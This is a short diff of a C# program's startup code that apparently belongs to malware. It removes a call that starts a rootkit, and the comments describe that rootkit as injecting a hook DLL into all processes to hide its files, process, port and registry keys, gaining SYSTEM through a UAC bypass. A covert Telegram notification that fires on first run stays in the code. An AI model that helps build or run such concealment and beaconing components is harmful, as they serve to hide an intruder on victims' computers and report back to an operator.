@@ -394,11 +394,6 @@ partial class Program
             }
         }
 
-        // Rootkit: inject hook DLL into all processes to hide our files/process/port/registry.
-        // Requires admin (or SYSTEM from UAC bypass) — CreateRemoteThread into system processes needs it.
-        if (Config.EnableRootkit && admin)
-            Rootkit.Start();
-
         // First-run Telegram notification — fires async, never blocks startup
         TelegramNotifier.NotifyAsync();
 
